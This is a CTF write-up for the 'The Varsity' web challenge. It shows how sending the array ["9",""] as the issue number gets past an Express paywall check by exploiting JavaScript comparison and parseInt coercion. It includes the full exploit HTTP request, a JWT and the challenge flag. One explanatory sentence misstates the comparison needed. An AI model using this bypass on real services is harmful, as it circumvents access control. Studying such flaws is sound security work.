---
title: The Varsity
date: 2024-01-16
tags: web
categories: UofTCTF 2024
---

written by {% person hartmannsyg %}

We are supposed to access the 10th article (index 9). However that require's a premium subscription, which we cannot get (as far as I know it is impregnable).

{% ccb gutter1:1-34 lang:js highlight:14,20,26 %}
app.post("/article", (req, res) => {
  const token = req.cookies.token;

  if (token) {
    try {
      const decoded = jwt.verify(token, JWT_SECRET);

      let issue = req.body.issue;

      if (req.body.issue < 0) {
        return res.status(400).json({ message: "Invalid issue number" });
      }

      if (decoded.subscription !== "premium" && issue >= 9) {
        return res
          .status(403)
          .json({ message: "Please subscribe to access this issue" });
      }

      issue = parseInt(issue);

      if (Number.isNaN(issue) || issue > articles.length - 1) {
        return res.status(400).json({ message: "Invalid issue number" });
      }

      return res.json(articles[issue]);
    } catch (error) {
      res.clearCookie("token");
      return res.status(403).json({ message: "Not Authenticated" });
    }
  } else {
    return res.status(403).json({ message: "Not Authenticated" });
  }
});
{% endccb %}

Effectively, we need an `issue` what is less than are equal to 9 (`<=9`), but becomes 9 after `parseInt()`:
```js
let issue = ["9", ""]
console.log(issue <= 9) // false
console.log(parseInt(issue)) // 9 
```

So we send our array: `["9", ""]`:

```http
POST /article HTTP/1.1
Host: uoftctf-the-varsity.chals.io
Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImEiLCJzdWJzY3JpcHRpb24iOiJndWVzdCIsImlhdCI6MTcwNTM3NTMyOSwiZXhwIjoxNzA1NDYxNzI5fQ.P1qaLqOO9t1rOVg__dXiCC67oycdtz1GaWJkkv54zOo
Content-Length: 20
Sec-Ch-Ua: "Not_A Brand";v="8", "Chromium";v="120"
Sec-Ch-Ua-Platform: "Windows"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.199 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: https://uoftctf-the-varsity.chals.io
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://uoftctf-the-varsity.chals.io/
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Priority: u=1, i
Connection: close

{"issue":["9",""]}
```
response:
```json
{
    "title":"UofT Hosts its 2nd Inaugural Capture the Flag Event",
    "content":"Your flag is: uoftctf{w31rd_b3h4v10r_0f_parseInt()!}"
}
```